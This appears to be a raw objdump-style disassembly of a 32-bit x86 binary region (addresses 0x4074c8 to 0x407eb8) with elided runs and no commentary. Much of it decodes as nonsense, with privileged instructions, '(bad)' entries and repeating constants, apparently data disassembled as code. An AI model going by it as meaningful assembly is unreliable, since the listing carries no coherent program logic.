  4074c8:	stos   BYTE PTR es:[edi],al
  4074c9:	and    BYTE PTR [ecx-0x4],bl
  4074cc:	jbe    0x4074ee
  4074ce:	push   ebp
  4074cf:	cld    
  4074d0:	and    cl,BYTE PTR cs:[esp+edi*8+0x5a]
  4074d5:	and    al,BYTE PTR [edi-0x4]
  4074d8:	sub    DWORD PTR [edx],esp
  4074da:	ds cld 
  4074dc:	mul    DWORD PTR [ecx]
  4074de:	sub    esp,edi
  4074e0:	fisub  WORD PTR [ecx]
  4074e2:	sub    ah,bh
  4074e4:	stc    
  4074e5:	and    DWORD PTR [ebx-0x5bde0f05],ebp
  4074eb:	sti    
  4074ec:	adc    esp,DWORD PTR [edx]
  4074ee:	mov    eax,ds:0xa02246fb
  4074f3:	sti    
	...
  407510:	add    BYTE PTR [eax],al
  407512:	iret   
  407513:	and    DWORD PTR [ebx+edi*8-0x450e1a2],esi
  40751a:	cmp    al,0x1e
  40751c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40751d:	sti    
  40751e:	in     eax,dx
  40751f:	and    DWORD PTR [edi-0x3cde0b05],edx
  407525:	sti    
  407526:	mov    WORD PTR [ecx],fs
  407528:	ret    0x8ffb
  40752b:	and    DWORD PTR [ebp-0x53de0a05],esi
  407531:	sti    
  407532:	in     al,0x21
  407534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407535:	sti    
  407536:	jmp    0x407559
  407538:	sahf   
  407539:	sti    
  40753a:	repnz and DWORD PTR [esi+0x77220cfb],eax
  407541:	sti    
  407542:	jl     0x407542
  407544:	popa   
  407545:	sti    
  407546:	sbb    BYTE PTR [esi],0x5d
  407549:	sti    
  40754a:	popf   
  40754b:	and    DWORD PTR [ebx+edi*8-0x64],edx
  40754f:	and    DWORD PTR [edi-0x5],ecx
  407552:	lahf   
  407553:	and    DWORD PTR [esi],esp
  407555:	cli    
  407556:	sub    al,0x1c
  407558:	dec    ecx
  407559:	cli    
  40755a:	rcr    BYTE PTR ds:0x91e74800,1
  407560:	and    eax,0x23f8d74b
  407565:	or     dl,bh
  407567:	mul    DWORD PTR [ebx]
  407569:	add    eax,0xc23f4c7
  40756e:	(bad)  
  40756f:	stc    
  407570:	and    eax,DWORD PTR [ecx]
  407572:	mov    bh,0x1f
  407574:	and    al,0x10
	...
  407592:	add    BYTE PTR [eax],al
  407594:	mov    bh,0xf6
  407596:	and    edx,DWORD PTR [ebx]
  407598:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407599:	or     esp,DWORD PTR ds:0x24f3a702
  40759f:	std    
  4075a0:	xchg   esp,eax
  4075a1:	mul    DWORD PTR [esp+edx*8]
  4075a4:	add    BYTE PTR [eiz*1+0x252418cf],cl
  4075ab:	(bad)  
  4075ac:	adc    BYTE PTR [esi-0x58f726dd],ah
  4075b2:	and    edi,DWORD PTR [eax-0x44db0000]
  4075b8:	sbb    BYTE PTR [ebx+eiz*1+0x23a510ba],ah
  4075bf:	mov    ch,0x8
  4075c1:	add    al,0x25
  4075c3:	pushf  
  4075c4:	add    BYTE PTR [eiz*1+0x252c1897],bl
  4075cb:	sahf   
  4075cc:	adc    BYTE PTR [eiz*1+0x24fe0891],dl
  4075d3:	dec    eax
  4075d4:	add    edi,edi
  4075d6:	pop    ds
  4075d7:	dec    ebx
  4075d8:	sbb    edi,esi
  4075da:	pop    ds
  4075db:	dec    edx
  4075dc:	adc    edi,esp
  4075de:	pop    ds
  4075df:	inc    ebp
  4075e0:	or     edi,ebp
  4075e2:	pop    ds
  4075e3:	mov    WORD PTR [ebx],es
  4075e5:	sti    
  4075e6:	pop    ds
  4075e7:	xchg   DWORD PTR [ebx],ebx
  4075e9:	clc    
  4075ea:	pop    ds
  4075eb:	mov    ss,WORD PTR [ebx]
  4075ed:	stc    
  4075ee:	pop    ds
  4075ef:	or     DWORD PTR [ebx],0x9d001ff6
  4075f5:	icebp  
  4075f6:	adc    esp,DWORD PTR [eax]
	...
  407614:	add    BYTE PTR [eax],al
  407616:	jle    0x407609
  407618:	adc    ah,BYTE PTR [eax]
  40761a:	mov    cl,dh
  40761c:	and    ah,BYTE PTR [edx+ebx*2]
  40761f:	repnz and eax,0x24f23b20
  407625:	and    BYTE PTR [edx+esi*8+0x52],ah
  407629:	and    DWORD PTR [ebp-0xe],esp
  40762c:	push   ebx
  40762d:	and    DWORD PTR [esi-0xe],edx
  407630:	push   esp
  407631:	and    edi,esi
  407633:	icebp  
  407634:	push   ebp
  407635:	and    eax,esp
  407637:	icebp  
  407638:	push   esi
  407639:	and    ecx,esp
  40763b:	icebp  
  40763c:	push   edi
  40763d:	and    edx,esp
  40763f:	icebp  
  407640:	pop    eax
  407641:	and    DWORD PTR [ebx-0xc],esi
  407644:	pop    ecx
  407645:	and    DWORD PTR [esp+esi*8-0xb60defc],ebp
  40764c:	adc    DWORD PTR [eax],esp
  40764e:	mov    ah,dh
  407650:	sub    BYTE PTR [ebx],ah
  407652:	mov    esp,esi
  407654:	sub    eax,0x29f4ea00
  407659:	and    esi,DWORD PTR [edi-0x4fdea50c]
  40765f:	hlt    
  407660:	pop    ebx
  407661:	and    DWORD PTR [ecx+0x72215cf4],esp
  407667:	hlt    
  407668:	pop    ebp
  407669:	and    DWORD PTR [ebp-0xc],ebp
  40766c:	and    DWORD PTR [ecx],esp
  40766e:	outs   dx,BYTE PTR ds:[esi]
  40766f:	hlt    
  407670:	adc    ah,BYTE PTR [esi]
  407672:	js     0x407668
  407674:	shl    BYTE PTR ds:0x25b6f479,0x0
	...
  407697:	add    BYTE PTR [edx-0xc],ch
  40769a:	retf   0x7b25
  40769d:	hlt    
  40769e:	scas   al,BYTE PTR es:[edi]
  40769f:	and    eax,0x2017f4d4
  4076a4:	inc    ebp
  4076a5:	repz sbb BYTE PTR [eax],ah
  4076a8:	or     eax,0x2d1c0d25
  4076ad:	es or  eax,0xd032d1d
  4076b3:	push   ds
  4076b4:	sub    al,0x9
  4076b6:	or     eax,0xd022d32
  4076bb:	xor    ebp,DWORD PTR ds:0x2a1d0d10
  4076c1:	mov    esi,0x22f0ac0c
  4076c6:	or     eax,0xd2be8c0
  4076cb:	mov    dh,0xf0
  4076cd:	adc    BYTE PTR ds:0xd19e8cf,cl
  4076d3:	scas   al,BYTE PTR es:[edi]
  4076d4:	lock test BYTE PTR [esi+eiz*8],0xe8
  4076d9:	test   DWORD PTR [ebx+ebp*4],0xad0cf4f0
  4076e0:	call   0x30f3851a
  4076e5:	cmp    ecx,DWORD PTR [esi]
  4076e7:	mov    ebp,0x60e3428
  4076ec:	xor    edi,DWORD PTR [ecx]
  4076ee:	push   cs
  4076ef:	and    ch,BYTE PTR ds:0x30aa0e32
  4076f5:	dec    edi
  4076f6:	push   cs
  4076f7:	mov    dl,0x28
  4076f9:	inc    eax
  4076fa:	push   cs
  4076fb:	mov    esp,0x0
	...
  407718:	add    BYTE PTR [eax],al
  40771a:	xor    BYTE PTR ds:0x8e2b1c0e,bh
  407720:	push   cs
  407721:	push   ds
  407722:	repz jb 0x407733
  407725:	arpl   bx,bp
  407727:	jnp    0x407737
  407729:	data16 repz loopne 0x40773a
  40772d:	gs jmp 0x407716
  407730:	or     eax,0xde7f220
  407735:	and    ch,ch
  407737:	in     al,0xd
  407739:	and    ebp,ebp
  40773b:	in     eax,0xd
  40773d:	adc    ebp,edx
  40773f:	call   FWORD PTR [esi+ecx*1+0x22]
  407743:	sbb    DWORD PTR [esi+ecx*1+0x72],edx
  407747:	sbb    bl,BYTE PTR [edi+0xe]
  40774a:	push   0x4f0e561a
  40774f:	sbb    al,BYTE PTR [ecx+0xe]
  407752:	dec    ebp
  407753:	sbb    al,BYTE PTR [eax+0xe]
  407756:	adc    ebx,DWORD PTR [edx]
  407758:	xor    ecx,DWORD PTR [esi]
  40775a:	add    BYTE PTR ds:0x1efa0e32,bl
  407760:	and    eax,0x1c20050e
  407765:	push   cs
  407766:	daa    
  407767:	and    BYTE PTR [edi],dl
  407769:	push   cs
  40776a:	sbb    esp,DWORD PTR [eax]
  40776c:	dec    edx
  40776d:	or     eax,0xd4efff1
  407772:	jmp    0x407773
  407774:	push   eax
  407775:	or     eax,0xd401df5
  40777a:	repnz sbb eax,0xd29
	...
  40779c:	(bad)  
  40779d:	jmp    FWORD PTR [edx-0x55e24ff4]
  4077a3:	or     al,0x34
  4077a5:	push   ds
  4077a6:	lods   eax,DWORD PTR ds:[esi]
  4077a7:	or     al,0x7
  4077a9:	sbb    eax,0xffd20ca7
  4077ae:	mov    dl,0xc
  4077b0:	add    eax,0x780cad1e
  4077b5:	sbb    al,0xa7
  4077b7:	or     al,0xb1
  4077b9:	sbb    eax,0x1a460c9e
  4077be:	mov    edx,0xb71d150c
  4077c3:	or     al,0xf7
  4077c5:	sbb    eax,0x1d8e0cb1
  4077ca:	mov    bl,0xc
  4077cc:	(bad)  
  4077cd:	sbb    eax,0x1d6f0ca5
  4077d2:	jge    0x4077e0
  4077d4:	outs   dx,BYTE PTR ds:[esi]
  4077d5:	sbb    eax,0x90a9600
  4077da:	and    BYTE PTR [ecx+0x48055002],cl
  4077e0:	sbb    dh,BYTE PTR [ecx]
  4077e2:	add    eax,0x532124b
  4077e7:	dec    edx
  4077e8:	or     dh,BYTE PTR [ebx]
  4077ea:	add    eax,0x5340245
  4077ef:	dec    esp
  4077f0:	sbb    dh,BYTE PTR ds:0x36124705
  4077f6:	add    eax,0x5370a4e
  4077fb:	inc    ecx
  4077fc:	add    bh,BYTE PTR [eax]
  4077fe:	add    eax,0x10
	...
  40781b:	add    BYTE PTR [eax],al
  40781d:	add    BYTE PTR [edx],bl
  40781f:	cmp    DWORD PTR ds:0x53a1213,eax
  407825:	add    cl,BYTE PTR [edx]
  407827:	cmp    eax,DWORD PTR ds:0x53c03fd
  40782d:	adc    al,0x1a
  40782f:	cmp    eax,0x3e120f05
  407834:	add    eax,0x53f0a06
  407839:	stc    
  40783a:	add    esp,DWORD PTR [eax+0x5]
  40783d:	fcomp  DWORD PTR ds:0x1ddb0561
  407843:	bound  eax,QWORD PTR ds:0x5631dda
  407849:	aad    0x1d
  40784b:	fs add eax,0x564fdbc
  407851:	mov    bh,0xfd
  407853:	gs add eax,0x566fdbe
  407859:	mov    cl,0xfd
  40785b:	addr16 add eax,0x5691da0
  407861:	mov    ds:0x48056a1d,eax
  407866:	sbb    al,0x1
  407868:	push   cs
  407869:	dec    ebx
  40786a:	sbb    al,0x2
  40786c:	push   cs
  40786d:	add    bh,dl
  40786f:	lock add cl,BYTE PTR [esi]
  407872:	enter  0x3f0,0xe
  407876:	leave  
  407877:	lock add al,0xe
  40787a:	retf   0x5f0
  40787d:	push   cs
  40787e:	fwait
  40787f:	lock push es
  407881:	push   cs
	...
  40789e:	add    BYTE PTR [eax],al
  4078a0:	pushf  
  4078a1:	lock pop es
  4078a3:	push   cs
  4078a4:	(bad)  
  4078a5:	lock or BYTE PTR [esi],cl
  4078a8:	mov    ?,eax
  4078aa:	or     DWORD PTR [esi],ecx
  4078ac:	jg     0x40789e
  4078ae:	or     cl,BYTE PTR [esi]
  4078b0:	nop
  4078b1:	lock or ecx,DWORD PTR [esi]
  4078b4:	xchg   ecx,eax
  4078b5:	lock or al,0xe
  4078b8:	push   edx
  4078b9:	icebp  
  4078ba:	or     eax,0xef1630e
  4078bf:	push   cs
  4078c0:	fs icebp 
  4078c2:	femms  
  4078c4:	push   ebp
  4078c5:	icebp  
  4078c6:	adc    BYTE PTR [esi],cl
  4078c8:	push   esi
  4078c9:	icebp  
  4078ca:	adc    DWORD PTR [esi],ecx
  4078cc:	out    0xf0,eax
  4078ce:	adc    cl,BYTE PTR [esi]
  4078d0:	fdiv   st,st(0)
  4078d2:	adc    ecx,DWORD PTR [esi]
  4078d4:	f2xm1  
  4078d6:	adc    al,0xe
  4078d8:	(bad)  
  4078da:	adc    eax,0x16efab0e
  4078df:	push   cs
  4078e0:	lods   al,BYTE PTR ds:[esi]
  4078e1:	out    dx,eax
  4078e2:	pop    ss
  4078e3:	push   cs
  4078e4:	popf   
  4078e5:	out    dx,eax
  4078e6:	sbb    BYTE PTR [esi],cl
  4078e8:	sahf   
  4078e9:	out    dx,eax
  4078ea:	sbb    DWORD PTR [esi],ecx
  4078ec:	(bad)  
  4078ed:	out    dx,eax
  4078ee:	sbb    cl,BYTE PTR [esi]
  4078f0:	loopne 0x4078e1
  4078f2:	sbb    ecx,DWORD PTR [esi]
  4078f4:	loope  0x4078e5
  4078f6:	sbb    al,0xe
  4078f8:	loop   0x4078e9
  4078fa:	sbb    eax,0x1eefb30e
  4078ff:	push   cs
  407900:	je     0x4078f1
  407902:	pop    ds
  407903:	push   cs
	...
  407920:	add    BYTE PTR [eax],al
  407922:	or     eax,0x32110a8
  407927:	stos   DWORD PTR es:[edi],eax
  407928:	adc    BYTE PTR [edx],ah
  40792a:	sbb    ebp,DWORD PTR [edx-0x5aecdcf0]
  407930:	adc    BYTE PTR [ebx+ecx*1],ah
  407933:	lods   al,BYTE PTR ds:[esi]
  407934:	adc    BYTE PTR ds:0x2610a703,ah
  40793a:	sbb    ebp,DWORD PTR [esi]
  40793c:	adc    BYTE PTR [edi],ah
  40793e:	adc    ecx,DWORD PTR [edi]
  407940:	adc    BYTE PTR [eax],ch
  407942:	or     esp,DWORD PTR [eax]
  407944:	adc    BYTE PTR [ecx],ch
  407946:	add    esp,DWORD PTR [ecx]
  407948:	adc    BYTE PTR [edx],ch
  40794a:	sbb    edx,DWORD PTR [edx]
  40794c:	adc    BYTE PTR [ebx],ch
  40794e:	adc    ebp,DWORD PTR [ebx]
  407950:	adc    BYTE PTR [ebx+ecx*1],ch
  407953:	and    al,0x10
  407955:	sub    eax,0x2e0ffd03
  40795a:	sbb    edx,DWORD PTR [esi]
  40795c:	adc    BYTE PTR [edi],ch
  40795e:	adc    edx,DWORD PTR [edi]
  407960:	adc    BYTE PTR [eax],dh
  407962:	or     ebx,DWORD PTR [eax]
  407964:	adc    BYTE PTR [ecx],dh
  407966:	add    ebx,DWORD PTR [ecx]
  407968:	adc    BYTE PTR [edx],dh
  40796a:	sbb    edi,edx
  40796c:	rdpmc  
  40796e:	adc    esi,ebx
  407970:	sysenter 
  407972:	or     edi,esp
  407974:	sysexit 
  407976:	add    esi,ebp
  407978:	(bad)  
  40797a:	sbb    ebx,DWORD PTR [esi+0x3f13370f]
  407980:	pmulhrsw mm2,QWORD PTR [eax+0x390f]
	...
  4079a4:	add    edx,DWORD PTR [ecx-0x5ae4c5f1]
  4079aa:	(bad)  
  4079ac:	adc    edi,DWORD PTR [esi+0xf]
  4079af:	aas    
  4079b0:	or     eax,DWORD PTR [edi+0xf]
  4079b3:	inc    eax
  4079b4:	add    ecx,DWORD PTR [eax+0xf]
  4079b7:	inc    ecx
  4079b8:	sbb    eax,DWORD PTR [eax]
  4079ba:	mov    ecx,DWORD PTR [edi]
  4079bc:	iret   
  4079bd:	or     eax,0xdce0f8a
  4079c2:	lea    ecx,[edi]
  4079c4:	leave  
  4079c5:	or     eax,0xdd00f84
  4079ca:	(bad)  
  4079cb:	bswap  ebx
  4079cd:	or     eax,0xdd20f86
  4079d2:	or     DWORD PTR [edi],0xf800dc5
  4079d8:	push   esp
  4079d9:	push   cs
  4079da:	push   ebx
  4079db:	xorps  xmm1,XMMWORD PTR [esi]
  4079de:	push   edx
  4079df:	cmovbe ecx,DWORD PTR [esi]
  4079e2:	inc    ebp
  4079e3:	cmovno ecx,DWORD PTR [esi]
  4079e6:	cmp    al,0xf
  4079e8:	pop    eax
  4079e9:	push   cs
  4079ea:	cmp    DWORD PTR [edi],ecx
  4079ec:	cmp    eax,0x3c0f380e
  4079f1:	push   cs
  4079f2:	cmp    ecx,DWORD PTR [edi]
  4079f4:	aas    
  4079f5:	push   cs
  4079f6:	cmp    cl,BYTE PTR [edi]
  4079f8:	pop    esi
  4079f9:	push   cs
  4079fa:	sbb    eax,0x140e590f
  4079ff:	punpcklbw mm1,DWORD PTR [esi]
  407a02:	pop    ds
  407a03:	cvtdq2ps xmm1,XMMWORD PTR [esi]
  407a06:	push   ss
  407a07:	sldt   WORD PTR [eax]
	...
  407a26:	inc    edx
  407a27:	push   cs
  407a28:	add    DWORD PTR [edi],ecx
  407a2a:	inc    ebp
  407a2b:	push   cs
  407a2c:	add    BYTE PTR [edi],cl
  407a2e:	xor    al,0xe
  407a30:	dec    eax
  407a31:	push   cs
  407a32:	fmul   QWORD PTR [esi]
  407a34:	dec    ebx
  407a35:	push   cs
  407a36:	aas    
  407a37:	jp     0x854fb84a
  407a3d:	or     eax,0xd8c0f41
  407a42:	cmp    BYTE PTR [edi],cl
  407a44:	xchg   DWORD PTR ds:0xd8e0f23,ecx
  407a4a:	sbb    cl,BYTE PTR [edi]
  407a4c:	xchg   ecx,eax
  407a4d:	or     eax,0x80000f15
  407a52:	add    BYTE PTR [edi],dl
  407a54:	xor    DWORD PTR [ebx+0x52311a18],eax
  407a5a:	adc    BYTE PTR [ecx],bl
  407a5c:	xor    DWORD PTR [ebp+0x8],ecx
  407a5f:	sbb    al,0x31
  407a61:	inc    esp
  407a62:	add    BYTE PTR [ebx],bl
  407a64:	xor    DWORD PTR [edi],edi
  407a66:	sbb    BYTE PTR [esi],bl
  407a68:	xor    DWORD PTR [esi+0x10],edx
  407a6b:	sbb    eax,0xc0083931
  407a70:	xor    BYTE PTR [eax],bh
  407a72:	add    BYTE PTR [edi-0x41e7c4d0],bh
  407a78:	xor    BYTE PTR [edx-0x6acf40f0],bl
  407a7e:	or     ah,al
  407a80:	xor    BYTE PTR [eax+eax*1+0x189730c5],bl
  407a87:	ret    0x7e30
	...
  407aa6:	add    BYTE PTR [eax],al
  407aa8:	adc    bl,al
  407aaa:	xor    BYTE PTR [ecx+0x7030c808],al
  407ab0:	add    cl,cl
  407ab2:	xor    BYTE PTR [ebx+0x18],dh
  407ab5:	(bad)  
  407ab6:	xor    BYTE PTR [edx+0x10],ah
  407ab9:	(bad)  
  407aba:	xor    BYTE PTR [ebp+0x8],bl
  407abd:	int3   
  407abe:	xor    BYTE PTR [eax+eax*1-0x33],dl
  407ac2:	xor    BYTE PTR [edi+0x18],cl
  407ac5:	retf   0x4630
  407ac8:	adc    bl,cl
  407aca:	xor    BYTE PTR [ecx],ch
  407acc:	or     BYTE PTR [eax-0x4effd7d0],dh
  407ad2:	xor    BYTE PTR [ebx],ch
  407ad4:	sbb    BYTE PTR [esi-0x50e855d0],ch
  407ada:	xor    BYTE PTR [ebp-0x53cf4bf9],ah
  407ae0:	pop    es
  407ae1:	mov    ch,0x30
  407ae3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ae4:	pop    ss
  407ae5:	mov    dl,0x30
  407ae7:	add    BYTE PTR [ebx-0x63cea8fa],dh
  407aed:	push   es
  407aee:	pop    eax
  407aef:	xor    DWORD PTR [ebp+0x6e315906],ebp
  407af5:	push   es
  407af6:	pop    edx
  407af7:	xor    DWORD PTR [edi+0x6],edi
  407afa:	pop    ebx
  407afb:	xor    DWORD PTR [eax+0x6],ebp
  407afe:	pop    esp
  407aff:	xor    DWORD PTR [ecx+0x6],ebp
  407b02:	pop    ebp
  407b03:	xor    DWORD PTR [edx+0x5b315e06],ecx
  407b09:	push   es
  407b0a:	pop    edi
  407b0b:	xor    DWORD PTR [eax],eax
	...
  407b29:	add    BYTE PTR [esi+eax*1+0x60],dh
  407b2d:	xor    DWORD PTR [ebp+0x6],esi
  407b30:	popa   
  407b31:	xor    DWORD PTR [esi+0x47316205],esp
  407b37:	push   es
  407b38:	arpl   WORD PTR [ecx],si
  407b3a:	inc    eax
  407b3b:	push   es
  407b3c:	test   al,0x11
  407b3e:	xor    DWORD PTR [esi],eax
  407b40:	test   eax,0xaa062211
  407b45:	adc    DWORD PTR [ebx],eax
  407b47:	push   es
  407b48:	stos   DWORD PTR es:[edi],eax
  407b49:	adc    DWORD PTR [esi+eax*1],ebp
  407b4c:	lods   al,BYTE PTR ds:[esi]
  407b4d:	adc    ebp,edi
  407b4f:	add    eax,0x61e11ad
  407b54:	scas   al,BYTE PTR es:[edi]
  407b55:	adc    DWORD PTR [edi+0x6],ecx
  407b58:	scas   eax,DWORD PTR es:[edi]
  407b59:	adc    eax,edi
  407b5b:	add    eax,0x5f911b0
  407b60:	mov    cl,0x11
  407b62:	cli    
  407b63:	add    eax,0x5eb11b2
  407b68:	mov    bl,0x11
  407b6a:	add    al,0x6
  407b6c:	mov    ah,0x11
  407b6e:	add    eax,0x1611b506
  407b73:	push   es
  407b74:	mov    dh,0x11
  407b76:	push   edi
  407b77:	or     BYTE PTR [edi-0x47f7afef],dh
  407b7d:	adc    DWORD PTR ds:0xfcb9094c,ecx
  407b83:	inc    edx
  407b84:	or     DWORD PTR [edx-0x44f6b604],edi
  407b8a:	cld    
  407b8b:	xor    BYTE PTR [ecx],cl
  407b8d:	mov    esp,0x0
	...
  407baa:	add    BYTE PTR [eax],al
  407bac:	cld    
  407bad:	aas    
  407bae:	or     DWORD PTR [ebp-0x41f6c0e4],edi
  407bb4:	sbb    al,0x6e
  407bb6:	or     DWORD PTR [edi-0x3ff672e4],edi
  407bbc:	sbb    al,0x84
  407bbe:	or     ecx,eax
  407bc0:	cld    
  407bc1:	fimul  DWORD PTR [eax]
  407bc3:	ret    0x71fc
  407bc6:	or     DWORD PTR [ebp-0x24],ebp
  407bc9:	fmul   DWORD PTR [eax]
  407bcb:	jno    0x407ba9
  407bcd:	xlat   BYTE PTR ds:[ebx]
  407bce:	or     BYTE PTR [eax+0x3c],bh
  407bd1:	aad    0x8
  407bd3:	jg     0x407c11
  407bd5:	mov    dh,0x8
  407bd7:	cmp    DWORD PTR [ebx+esi*4],0xbc3c8408
  407bde:	or     BYTE PTR [esi-0x72f74ee4],al
  407be4:	sbb    al,0x1a
  407be6:	or     DWORD PTR [esi-0x14f740e4],ecx
  407bec:	cld    
  407bed:	wbinvd 
  407bef:	lock sbb al,0xd
  407bf2:	or     ecx,edi
  407bf4:	sbb    al,0x22
  407bf6:	or     DWORD PTR [ecx-0x540a3d13],ebp
  407bfc:	in     eax,dx
  407bfd:	mov    dl,0xf5
  407bff:	push   ecx
  407c00:	or     al,0xcc
  407c02:	cmc    
  407c03:	push   edx
  407c04:	or     al,0xc1
  407c06:	cmc    
  407c07:	ja     0x407c15
  407c09:	(bad)  
  407c0a:	and    ah,BYTE PTR [eax-0x5edd3813]
	...
  407c2c:	add    BYTE PTR [eax],al
  407c2e:	sub    eax,0x2da222c5
  407c33:	add    BYTE PTR [edx-0x7adf51dc],cl
  407c39:	and    al,0xa9
  407c3b:	and    BYTE PTR [esp+0x248720b0],cl
  407c42:	stos   DWORD PTR es:[edi],eax
  407c43:	and    BYTE PTR [esi-0x6edf4ddc],cl
  407c49:	and    al,0xa5
  407c4b:	and    BYTE PTR [eax-0x7cdf8bdc],al
  407c51:	and    al,0x77
  407c53:	and    BYTE PTR [edx+0x24],dl
  407c56:	data16 and BYTE PTR [ebp+0x24],cl
  407c5a:	popa   
  407c5b:	and    cl,ah
  407c5d:	pop    eax
  407c5e:	or     eax,0xd03e100
  407c63:	add    al,dh
  407c65:	pop    eax
  407c66:	or     eax,0xd03f000
  407c6b:	add    dl,ah
  407c6d:	pop    eax
  407c6e:	or     eax,0xd03dd00
  407c73:	add    ah,dh
  407c75:	pop    eax
  407c76:	or     eax,0xd03ec00
  407c7b:	add    dl,bh
  407c7d:	pop    eax
  407c7e:	or     eax,0xd03fa00
  407c83:	add    dl,ah
  407c85:	pop    eax
  407c86:	or     eax,0xd03e200
  407c8b:	add    BYTE PTR [esi],dh
  407c8d:	pop    ecx
  407c8e:	or     eax,0x2ff00
	...
  407caf:	add    BYTE PTR ds:0xd58b900,cl
  407cb5:	add    ch,al
  407cb7:	add    cl,BYTE PTR ds:0xd58b800
  407cbd:	add    ah,al
  407cbf:	add    cl,BYTE PTR ds:0xd589b00
  407cc5:	add    bh,al
  407cc7:	add    cl,BYTE PTR ds:0xe59a0000
  407ccd:	(bad)  
  407cce:	inc    ebp
  407cd0:	sldt   WORD PTR [eax]
  407cd3:	cmp    eax,0x10ffffd4
  407cd8:	push   cs
  407cd9:	add    BYTE PTR [eax],al
  407cdb:	cmp    al,0xc4
  407cdd:	(bad)  
  407cde:	inc    DWORD PTR [edi]
  407ce0:	push   cs
  407ce1:	add    BYTE PTR [eax],al
  407ce3:	pop    ds
  407ce4:	mov    ah,0xff
  407ce6:	dec    DWORD PTR [edx]
  407ce8:	push   cs
  407ce9:	add    BYTE PTR [eax],al
  407ceb:	push   ds
  407cec:	in     al,0xff
  407cee:	dec    DWORD PTR [ecx]
  407cf0:	push   cs
  407cf1:	add    BYTE PTR [eax],al
  407cf3:	or     esp,edx
  407cf5:	(bad)  
  407cf6:	dec    edi
  407cf8:	push   cs
  407cf9:	add    BYTE PTR [eax],al
  407cfb:	or     ah,al
  407cfd:	(bad)  
  407cfe:	(bad)  
  407cff:	mov    esp,0xb00000e
  407d04:	mov    ah,0xff
  407d06:	call   ecx
  407d08:	push   cs
  407d09:	add    BYTE PTR [eax],al
  407d0b:	or     ah,BYTE PTR [eax+eax*1+0x0]
  407d0f:	mov    esp,0xd300000f
	...
  407d30:	add    BYTE PTR [eax],al
  407d32:	push   ebp
  407d33:	add    BYTE PTR [eax],al
  407d35:	push   cs
  407d36:	or     DWORD PTR [eax],eax
  407d38:	add    dl,al
  407d3a:	inc    ebp
  407d3b:	add    BYTE PTR [eax],al
  407d3d:	jmp    0x35:0x6900000f
  407d44:	add    BYTE PTR [ecx],cl
  407d46:	or     DWORD PTR [eax],eax
  407d48:	add    BYTE PTR [eax+0x65],ah
  407d4b:	add    BYTE PTR [eax],al
  407d4d:	loopne 0x407d5d
  407d4f:	add    BYTE PTR [eax],al
  407d51:	je     0x407da8
  407d53:	add    BYTE PTR [eax],al
  407d55:	in     al,dx
  407d56:	sldt   WORD PTR [eax]
  407d59:	js     0x407da0
  407d5b:	add    BYTE PTR [eax],al
  407d5d:	cdq    
  407d5e:	push   cs
  407d5f:	add    BYTE PTR [eax],al
  407d61:	add    BYTE PTR [esi],dh
  407d63:	mov    eax,0x315ffff
  407d68:	add    BYTE PTR [eax],al
  407d6a:	out    0xb7,eax
  407d6c:	(bad)  
  407d6d:	inc    DWORD PTR [esi]
  407d6f:	add    eax,DWORD PTR [eax]
  407d71:	add    al,bh
  407d73:	scas   al,BYTE PTR es:[edi]
  407d74:	(bad)  
  407d75:	call   edi
  407d77:	sti    
  407d78:	(bad)  
  407d79:	(bad)  
  407d7a:	jmp    0x9407d2d
  407d7f:	cld    
  407d80:	(bad)  
  407d81:	(bad)  
  407d82:	mov    edx,0x9ffffae
  407d87:	cld    
  407d88:	(bad)  
  407d89:	(bad)  
  407d8a:	jmp    0x407d3a
  407d8c:	(bad)  
  407d8d:	dec    DWORD PTR [edx]
  407d8f:	cld    
  407d90:	(bad)  
  407d91:	dec    DWORD PTR [edi+ebp*4+0xffff]
	...
  407db4:	dec    ebx
  407db5:	add    eax,DWORD PTR [eax]
  407db7:	add    BYTE PTR [ebp+0x4cffffae],bl
  407dbd:	add    eax,DWORD PTR [eax]
  407dbf:	add    BYTE PTR [eax+0x47ffffae],dh
  407dc5:	add    eax,DWORD PTR [eax]
  407dc7:	add    BYTE PTR [esi-0x51],bl
  407dca:	(bad)  
  407dcb:	call   ebp
  407dcd:	add    al,BYTE PTR [eax]
  407dcf:	add    BYTE PTR [edi+0x6ffffae],cl
  407dd5:	cld    
  407dd6:	(bad)  
  407dd7:	jmp    DWORD PTR [ecx-0x51]
  407dda:	(bad)  
  407ddb:	inc    eax
  407ddd:	add    al,BYTE PTR [eax]
  407ddf:	add    BYTE PTR [edx-0x51],dh
  407de2:	(bad)  
  407de3:	inc    DWORD PTR [ecx]
  407de5:	cld    
  407de6:	(bad)  
  407de7:	jmp    DWORD PTR [ebx-0x51]
  407dea:	(bad)  
  407deb:	inc    edx
  407ded:	add    al,BYTE PTR [eax]
  407def:	add    BYTE PTR [esi-0x51],bl
  407df2:	(bad)  
  407df3:	call   FWORD PTR [esi+0xd000002]
  407df9:	ret    0x56
  407dfc:	or     eax,0xd000382
  407e01:	lods   eax,DWORD PTR ds:[esi]
  407e02:	push   esi
  407e03:	add    BYTE PTR ds:0xd000385,cl
  407e09:	mov    esp,0xd40d0056
  407e0e:	add    al,BYTE PTR [eax]
  407e10:	or     eax,0xd00566f
  407e15:	mov    DWORD PTR [ebx],0x0
	...
  407e33:	add    BYTE PTR [eax],al
  407e35:	add    BYTE PTR ds:0xd00567e,cl
  407e3b:	push   ss
  407e3c:	add    eax,0x55d90d00
  407e41:	add    BYTE PTR ds:0xd0003c9,cl
  407e47:	fcom   DWORD PTR [ebp+0x0]
  407e4a:	or     eax,0xd0003c8
  407e4f:	mov    ebx,0xb0d0055
  407e54:	add    al,0x0
  407e56:	or     eax,0xd0055ba
  407e5b:	or     al,BYTE PTR [eax+eax*1]
  407e5e:	or     eax,0xd005615
  407e63:	std    
  407e64:	add    eax,DWORD PTR [eax]
  407e66:	or     eax,0xd005614
  407e6b:	cld    
  407e6c:	add    eax,DWORD PTR [eax]
  407e6e:	or     eax,0xd005675
  407e73:	cmp    eax,0x760d0003
  407e78:	push   esi
  407e79:	add    BYTE PTR ds:0xd00033e,cl
  407e7f:	jg     0x407ed7
  407e81:	add    BYTE PTR ds:0xd00032f,cl
  407e87:	rcl    BYTE PTR [ebp+0x0],1
  407e8a:	or     eax,0xd000340
  407e8f:	add    BYTE PTR [edi+0x56],ah
  407e92:	or     eax,0xd039900
  407e97:	add    BYTE PTR [esi+0x56],dl
	...
  407eb6:	add    BYTE PTR [eax],al
  407eb8:	or     eax,0xd039800
